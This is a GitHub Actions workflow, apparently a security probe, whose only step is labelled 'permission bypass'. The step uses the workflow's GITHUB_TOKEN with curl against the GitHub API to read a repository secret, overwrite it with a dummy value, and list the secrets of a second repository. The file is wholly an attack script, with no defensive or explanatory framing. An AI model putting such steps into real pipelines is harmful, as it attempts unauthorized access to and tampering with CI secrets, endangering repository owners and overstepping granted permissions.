name: test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write
      secrets: write
    steps:
      - name: permission bypass
        run: |
          TOKEN="${{ secrets.GITHUB_TOKEN }}"
          curl -s -H "Authorization: Bearer $TOKEN" \
            "https://api.github.com/repos/Asad657/ssrf-test/actions/secrets/TEST_SECRET" | python3 -m json.tool | head -10
          curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            "https://api.github.com/repos/Asad657/ssrf-test/actions/secrets/TEST_SECRET" \
            -d '{"encrypted_value":"test","key_id":"test"}' | python3 -m json.tool | head -10
          curl -s -H "Authorization: Bearer $TOKEN" \
            "https://api.github.com/repos/Asad657/Assuhere/actions/secrets" | python3 -m json.tool | head -10
